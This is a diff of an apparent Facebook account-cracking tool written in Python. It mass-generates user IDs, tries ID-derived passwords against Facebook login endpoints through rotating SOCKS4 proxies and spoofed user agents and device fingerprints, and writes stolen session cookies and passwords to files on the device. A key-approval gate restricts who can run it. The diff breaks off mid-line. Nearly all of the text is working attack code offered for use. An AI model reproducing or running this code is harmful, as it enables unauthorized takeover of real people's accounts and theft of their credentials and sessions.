@@ -1,57 +1,45 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-facebook Cracker - Enhanced Version
-Fixed and optimized with cloning functionality
-Author: BITHIKA
-Version: 2.0
-"""
-
-import random
-import re
-import sys
-import time
-import hashlib
-import uuid
-import urllib.request
-import requests
-import string
+#si6xd
 import os
+import sys
+import re
+import bs4
+from bs4 import BeautifulSoup
+from bs4 import BeautifulSoup as sop
 import time,subprocess,platform,uuid
 import random
 import base64
 import string
-import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
-# Global variables with proper initialization
-loop = 0
-oks = []
-cps = []
-idz = []
-bkas = []
-red = "\033[1;31m"
-green = "\033[1;32m"
-yellow = "\033[1;33m"
-blue = "\033[1;34m"
-pink = "\033[1;35m"
-cyan = "\033[1;36m"
-white = "\033[1;37m"
-faltu = "\033[1;47m";pvt = "\033[1;0m";black="\033[1;30m"
-# Thread-safe locks
-counter_lock = threading.Lock()
-success_lock = threading.Lock()
-
-def clear():
-    """Cross-platform terminal screen clearing"""
-    try:
-        os.system('cls' if os.name == 'nt' else 'clear')
-    except Exception:
-        # Fallback for systems without clear command
-        print('\n' * 100)
-
-def linex():
-    """Print decorative line separator"""
-    print(f"\033[1;97m{'='*46}")
+import uuid
+import requests
+from concurrent.futures import ThreadPoolExecutor
+try:os.mkdir('/sdcard/j4rvis')
+except:pass
+R = '\x1b[1;91m' 
+OR = '\033[1;35m'
+G = '\x1b[1;92m' 
+Y = '\x1b[1;93m'
+O = '\x1b[1;98m'
+B = '\033[1;34m'
+W = '\033[1;97m'
+cyan="\033[1;36m"
+ugnn = []
+redmi=[]
+for x in range(1000):
+ rr = random.randint
+ rc = random.choice
+ A = f'Mozilla/5.0 (Linux; Android {str(rr(8,10))}; Redmi {str(rr(4,9))} Build/PPR1.'
+ B = f'{str(rr(111111,199999))}.011; en-us) AppleWebKit/537.36 '
+ C = f'(KHTML, like Gecko) UCBrowser/79.0.{str(rr(1111,9999))}.136 Mobile Safari'
+ D = f'/537.36 Puffin/9.7.2.{str(rr(11111,99999))}AP'
+ se = f'{A}{B}{C}{D}'
+ if se in redmi:pass
+ else:redmi.append(se)
+try:
+  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+  open('socksku.txt','w').write(proxylist)
+except Exception as e:
+  print(' server error')
+proxsi=open('socksku.txt','r').read().splitlines()
 
 sim_id = ''
 android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
@@ -112,33 +100,309 @@ fbcr = sim_id
 fbmf = device['fbmf']
 fbbd = device['fbbd']
 fbdm = device['fbdm']
+uge = []
+for xd in range(50000):
+    aa='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['1','2','3','4','5','6','7','8','9','10','11','12','13'])
+    c=f''+model+' Build/'+build+''
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(80,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
+    uge.append(uaku2)
+pc = random.choice(['Windows NT 6.1; WOW64','X11; CrOS x86_64 8172.45.0','Windows NT 10.0; Win64; x64','X11; Linux x86_64'])
+for Xr in range (9999):    
+    a=f"Mozilla/5.0 ("+pc+""
+    b=random.randrange(6, 12)
+    c=random.randrange(3, 13)
+    d='Build/'
+    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
+    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    g=random.randrange(80,100)
+    h='0'
+    i=random.randrange(4200,4900)
+    j=random.randrange(40,150)
+    k='Safari/537.36'
+    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
+    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
+    m=random.randrange(1,9)
+    n=random.randrange(1,9)
+    o='0'
+    p=random.randrange(5,20)
+    uaku=(f'{a}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
+    ugnn.append(uaku)
+ugn = []
+realme = random.choice(["D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w","SM-A515F","SM-A235F","SM-A525F","SM-A715F","SM-G996B","SM-A705F","SM-A315F","V2183A","I2223","V2307","V2314","I2217","V2239"])
+for Xr in range (50000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.randrange(6, 13)
+    c=random.randrange(3, 13)
+    d='Build/'
+    e=random.choice(["MMB29M","LRX22G","MRA58K","LMY47D"])
+    f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    g=random.randrange(100,150)
+    h='0'
+    i=random.randrange(4200,4900)
+    j=random.randrange(80,150)
+    k='Mobile Safari/537.36'
+    l=random.choice(["UCBrowser","VenusBrowser","HiBrowser","HeadlessChrome","PaleMoon","OPR","Edge","Viabrowser"])
+    #l=random.choice(["VenusBrowser","HiBrowser","HeadlessChrome"])
+    m=random.randrange(1,9)
+    n=random.randrange(1,9)
+    o='0'
+    p=random.randrange(5,20)
+    uaku=(f'{a} {b}; {realme}) {f}{g}.{h}.{i}.{j} {k}') #/{m}.{n}.{o}.{p}')
+    ugn.append(uaku)
+def generate_user_agent():
+    rr = random.randint
+    aZ = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')
+    rx = random.randrange(1, 999)
+    return (f"Mozilla/5.0 (Windows NT {rr(9,11)}; Win64; x64){aZ}{rx}{aZ}) "
+            f"AppleWebKit/537.36 (KHTML, like Gecko){rr(99,149)}.0.{rr(4500,4999)}.{rr(35,99)} "
+            f"Chrome/{rr(99,175)}.0.{rr(0,5)}.{rr(0,5)} Safari/537.36")
+def cek_apkk(session,coki):
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f"\r {Y}[{G}!{G}{Y}] {G}Sorry No Active Apps Found")
+    else:
+        print(f"\r {Y}[{G}•{G}{Y}] {W}Active Apps Or Websites")
+        for i in range(len(game)):
+            print(f" \r%s {Y}[{G}%s{G}{Y}] %s %s"%( G, i+1, game[i].replace("Ditambahkan pada"," Ditambahkan pada"),G))
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f"\r {Y}[{R}!{R}{Y}] {R}Sorry No Expired Apps Found")
+    else:
+        print(f"\r {Y}[{R}•{R}{Y}] {W}Expired Apps or Website")
+        for i in range(len(game)):
+            print(f" \r%s {Y}[{R}%s{R}{Y}] %s %s"%( B, i+1, game[i].replace("Kedaluwarsa"," Kedaluwarsa"),B))      
 
-def crack(uid, password_list, total_count):
-    """Enhanced facebook account cracking function"""
-    
-    # Thread-safe counter increment
-    with counter_lock:
-        global loop,bkas
-        loop += 1
-    
-    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
-              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
-    
+def cek_apk(session,coki):
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+            pass
+    w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+            pass      
+loop = 0
+oks = []
+gen = []
+logo = (f"""
+    \033[1;97m
+  .d88b  .d8b.  d8888b. db    db d888888b .d8888. 
+   `8P' d8' `8b 88  `8D 88    88   `88'   88'  YP \033
+    ~88  88ooo88 88oobY' Y8    8P    88    `8bo.~  
+    88  88~~~88 88`8b   `8b  d8'    88      `Y8b. 
+db. 88  88   88 88 `88.  `8bd8'    .88.   db   8D 
+Y8888P  YP   YP 88   YD    YP    Y888888P `8888Y'
+              \x1b[1;91m—————— \x1b[1;97m[{cyan}< {W}MAIN4K- {R}¹⁰{W}{cyan} >{W}] \x1b[1;91m——————
+\033[1;97m———————————————————————————————————————————————""")
+
+myid=uuid.uuid4().hex[:5].upper()
+def __iam_a_porche():
+    os.system('clear')
+    print(logo)
+    print('\033[1;92mChecking Approval ....\033[0;97m')
     try:
-        for pw in password_list:
-            # Display progress
-            color = random.choice(colors)
-            with counter_lock:
-                progress = loop
-                success_count = len(oks)
-                fail_count = len(cps)
-                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
-            
-            sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
-            sys.stdout.flush()
-            
-            # Create session and generate device hash
-            Session = requests.Session()
+        httpCaht = requests.get('https://github.com/Jarvis-070/approval-/blob/main/approval.txt').text
+        t1 = base64.b64encode(str(os.getuid()).encode('utf-8'))
+        t2 = base64.b64encode((str(platform.uname()[2])).encode('utf-8'))
+        uid = os.getuid()
+        kex=(f"BCC-{uid}TS{t1}")
+        gen_token=(f"{kex}")
+        fkeyx = gen_token.replace("b'","").replace("'","")
+        if fkeyx in httpCaht:
+            m()
+        else:
+            os.system('clear')
+            print(logo)
+            print('Your Key: '+fkeyx)
+            print(47*"—") 
+            print('This was a private tool')
+            print(47*"—") 
+    except Exception as e:
+        #print(e)
+        print('\n\033[1;31m error..\033[0;97m')
+
+def m():
+    os.system('clear');print(logo)
+    print(f'{Y}[{W}1{Y}] {W}HOST 1')
+    print(f'{Y}[{W}2{Y}] {W}HOST 2')
+    print(47*"—")
+    m = input(f'{Y}[{W}?{Y}] {W}Choose Method : ')
+    if m == '1':
+        main()
+    elif m == '2':
+        mainn()
+    
+def main():
+    os.system('clear')
+    print(logo)
+    code = input(f'{Y}[{W}~{Y}] {G}Choice code {W}: ') 
+    limit = input(f'{Y}[{W}~{Y}] {G}Total id {W}: ')
+    for a in range(int(limit)):
+        awm = "".join(random.choice(string.digits) for _ in range(6))
+        gen.append(awm)
+    with ThreadPoolExecutor(max_workers=60) as Submits:
+        print(47*"\x1b[1;97m—") 
+        for next in gen:
+            ids = code + next
+            mk = ids[:6]
+            xx = ids[:7]
+            v = ids[:8]
+            b = next[:6]  
+            passlist = [mk,xx,'57273200',v]
+            Submits.submit(cracker,ids,passlist)
+
+def live_ck(ids):
+    Heron=requests.get(f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={ids}").text
+    data=str(Heron)
+    if "live" == data.lower():
+        return "Alive"
+    else:
+        return "death"
+
+def convert(cookie):
+    cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
+    return(str(cok))
+
+def cracker(ids,passlist):
+    global loop,oks,cps
+    session = requests.Session()
+    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•1\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
+    sys.stdout.flush()
+    try:
+        for pas in passlist:
+            nip=random.choice(proxsi)
+            proxs= {'http': 'socks4://'+nip}
+            moz = random.choice(ugn)
+            facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+            bv = f"{random.randint(1111111,7777777)}"
+            versi_android = f"{random.randint(6,14)}"
+            deeevice = random.choice(["Nokia 2.4","TA-1277","TA-1357","Nokia C30","Nokia C12 Pro","TA-1339","Nokia C12","Nokia 3.4","Nokia G20","Nokia 6","Nokia C22","Nokia G22","Nokia G10","Nokia C31","TA-1499","TA-1418","Nokia C32"])
+            deevice = random.choice(["2312DRAABG","2201117TG","M2101K6G","Redmi Note 14","2404ARN45A","22111317I","23053RN02A","M2101K7AI","22101316C","23129RAA4G","Redmi Note 9 Pro","Redmi Note 10 Pro"])
+            device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
+            us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
+            up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
+            url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=701380926584428&kid_directed_site=0&app_id=701380926584428&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D701380926584428%26redirect_uri%3Dhttps%253A%252F%252Fauthgop.garena.com%252Funiversal%252Foauth%252Ffacebook%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%26state%3Dea31c02de0ef49f7a4631e898e2b0c27-client_id%253D10017%2526redirect_uri%253Dhttps%25253A%25252F%25252Fkiosgamer.co.id%25252F%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Did-ID%2526theme%253Dlight%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74cc2b3d-7bf3-4311-8087-4b5bc688fc69%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauthgop.garena.com%2Funiversal%2Foauth%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dea31c02de0ef49f7a4631e898e2b0c27-client_id%253D10017%2526redirect_uri%253Dhttps%25253A%25252F%25252Fkiosgamer.co.id%25252F%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Did-ID%2526theme%253Dlight%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr"
+            headers1 = {'Host': 'm.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'dpr': '3',
+            'referer': 'https://authgop.garena.com/',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'cross-site',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': us,
+            'viewport-width': '980',}     
+            requu1 = session.get(url1,headers=headers1)
+            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(requu1.text)).group(1), 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
+            #url = "https://mbasic.facebook.com/login/device-based/login/async/?api_key=701380926584428&auth_token=6e1816672c469f5289945253085b27e7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D701380926584428%26redirect_uri%3Dhttps%253A%252F%252Fauthgop.garena.com%252Funiversal%252Foauth%252Ffacebook%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%26state%3D02e39d216041425a884d7bda5844cc55-client_id%253D10017%2526redirect_uri%253Dhttps%25253A%25252F%25252Fkiosgamer.co.id%25252F%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Did-ID%2526theme%253Dlight%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8b4cc57-f754-4605-bf57-d7dcded70590%26tp%3Dunspecified&refsrc=deprecated&app_id=701380926584428&cancel=https%3A%2F%2Fauthgop.garena.com%2Funiversal%2Foauth%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D02e39d216041425a884d7bda5844cc55-client_id%253D10017%2526redirect_uri%253Dhttps%25253A%25252F%25252Fkiosgamer.co.id%25252F%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Did-ID%2526theme%253Dlight%23_%3D_&lwv=100"
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D701380926584428%26redirect_uri%3Dhttps%253A%252F%252Fauthgop.garena.com%252Funiversal%252Foauth%252Ffacebook%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%26state%3Da4b21a67efff4124b7b94679be63a7bf-client_id%253D10017%2526redirect_uri%253Dhttps%25253A%25252F%25252Fkiosgamer.co.id%25252F%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Did-ID%2526theme%253Dlight%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7e0eb251-6b38-4c7d-8a96-ebb795623b06%26tp%3Dunspecified%26cbt%3D1732985699796&lwv=100"
+            headers = {'authority': 'www.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'dpr': '3',
+            'origin': 'https://www.facebook.com',
+            'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=701380926584428&kid_directed_site=0&app_id=701380926584428&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D701380926584428%26redirect_uri%3Dhttps%253A%252F%252Fauthgop.garena.com%252Funiversal%252Foauth%252Ffacebook%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%26state%3Da4b21a67efff4124b7b94679be63a7bf-client_id%253D10017%2526redirect_uri%253Dhttps%25253A%25252F%25252Fkiosgamer.co.id%25252F%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Did-ID%2526theme%253Dlight%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7e0eb251-6b38-4c7d-8a96-ebb795623b06%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauthgop.garena.com%2Funiversal%2Foauth%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Da4b21a67efff4124b7b94679be63a7bf-client_id%253D10017%2526redirect_uri%253Dhttps%25253A%25252F%25252Fkiosgamer.co.id%25252F%2526response_type%253Dtoken%2526platform%253D3%2526locale%253Did-ID%2526theme%253Dlight%23_%3D_&display=page&locale=bn_IN&pl_dbl=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': us,
+            'viewport-width': '980',}             
+            response = session.post(url,data=log_data,headers=headers,allow_redirects=False,proxies=proxs)
+            log_cookies = session.cookies.get_dict().keys()
+            if "c_user" in log_cookies:
+                kuki = convert(session.cookies.get_dict())
+                user = re.findall('c_user=(.*);xs', kuki)[0]
+                print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+' | '+kuki+'\n')
+                open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                oks.append(ids)
+                break
+            elif "checkpoint" in log_cookies:
+                coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
+                cid = coki[24:39]
+                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
+                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                cps.append(ids)
+                break
+            else:continue
+        loop+=1
+    except requests.exceptions.ConnectionError:
+        time.sleep(20)
+    except Exception as e:
+        #print(f"\nError: {e}")
+        pass
+
+def mainn():
+    os.system('clear')
+    print(logo)
+    code = input(f'{Y}[{W}~{Y}] {G}Choice code {W}: ') 
+    limit = input(f'{Y}[{W}~{Y}] {G}Total id {W}: ')
+    for a in range(int(limit)):
+        awm = "".join(random.choice(string.digits) for _ in range(6))
+        gen.append(awm)
+    with ThreadPoolExecutor(max_workers=60) as Submits:
+        print(47*"\x1b[1;97m—") 
+        for next in gen:
+            ids = code + next
+            mk = ids[:6]
+            xx = ids[:7]
+            v = ids[:8]
+            b = next[:6]  
+            passlist = [mk,xx,'57273200',v]
+            Submits.submit(crackerr,ids,passlist)
+
+def convert(cookie):
+    cok = ('c_user=%s;xs=%s;fr=%s;datr=%s'%(cookie['c_user'],cookie['xs'],cookie['fr'],cookie['datr']))
+    return(str(cok))            
+
+def crackerr(ids,passlist):
+    global loop,oks,cps
+    session = requests.Session()
+    sys.stdout.write('\r \033[1;97m[\x1b[1;92mRNDM•2\x1b[1;97m] \x1b[1;92m%s\x1b[1;97m | \x1b[1;92m%s\x1b[1;97m \r'%(loop,len(oks))),
+    sys.stdout.flush()
+    try:
+        for pas in passlist:
+            nip=random.choice(proxsi)
+            proxs= {'http': 'socks4://'+nip}
+            moz = random.choice(ugn)
             facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
             bv = f"{random.randint(1111111,7777777)}"
             versi_android = f"{random.randint(6,14)}"
@@ -147,256 +411,74 @@ def crack(uid, password_list, total_count):
             device = random.choice(["M910x","D10i","2PXH3","D830x","U-2u","M910x","2PXH3","HTC_Desire_S_S510e","HTC_0P3P5","HTC_DesireHD_X315e","HTC_C715c","HTC_D616w"])
             us = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/en_US;FBBV/"+bv+";FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/"+deevice+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
             up = f"[FBAN/FB4A;FBAV/"+facebook_version+";FBPN/com.facebook.katana;FBLC/id_ID;FBBV/"+bv+";FBCR/"+fbcr+";FBMF/"+fbmf+";FBBD/"+fbbd+";FBDV/"+model+";FBSV/"+versi_android+";FBCA/arm64-v8a:null;FBDM/"+fbdm+"};FB_FW/1"
-            url1 = "https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1257995441580782&kid_directed_site=0&app_id=1257995441580782&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D1257995441580782%26redirect_uri%3Dhttps%253A%252F%252Fmy.plagramme.com%252Fusers%252Ffacebook%252Fcallback%26scope%3Demail%252Cpublic_profile%26response_type%3Dcode%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0388496f-9bad-4e7f-b2df-62e676ad873e%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmy.plagramme.com%2Fusers%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DxVgyvz0tqpnLJDIIXDB1oxqrqdc99sTGaVVdmeVi%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated"
-            requu1 = Session.get(url1)
-            log_data = {'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1","2","3","4","5","6","7","8","9","0"]), '__fmt': '0', '__a': '',  '__user': '0'}
-            #url = "https://x.prod.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fauth.huffpost.com%252Flogin%252Fcallback%26scope%3Demail%252Cpublic_profile%26state%3Di--slwF8Cg0z_6V_hAmn7TmLJfJkK0XF%26client_id%3D191788634204473%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dea798105-d632-4fcc-8498-9c6f3e0bdb90%26tp%3Dunspecified%26cbt%3D1734080551001&lwv=100"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
-            headers = {
-            'user-agent': us,
-            'Accept-Encoding': 'gzip, deflate',
-            'accept': '*/*',
-            'Connection': 'keep-alive',
-            'accept-language': 'en-US,en;q=0.9',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://m.facebook.com',
-            'priority': 'u=1, i',
-            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=507811537136246&kid_directed_site=0&app_id=507811537136246&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv10.0%2Fdialog%2Foauth%3Fapp_id%3D507811537136246%26cbt%3D1736483470728%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfadd3b7728fbfb6c3%2526domain%253Dwww.z2u.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.z2u.com%25252Ff3fcbc8cc23807a4b%2526relation%253Dopener%26client_id%3D507811537136246%26display%3Dpopup%26domain%3Dwww.z2u.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.z2u.com%252Flogin.html%26locale%3Den_US%26logger_id%3Df4ae87efc07dfc1f4%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df98748ee374d96fe2%2526domain%253Dwww.z2u.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.z2u.com%25252Ff3fcbc8cc23807a4b%2526relation%253Dopener%2526frame%253Df81b6c91ffd56da37%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv10.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df98748ee374d96fe2%26domain%3Dwww.z2u.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.z2u.com%252Ff3fcbc8cc23807a4b%2526relation%3Dopener%2526frame%3Df81b6c91ffd56da37%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duer_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
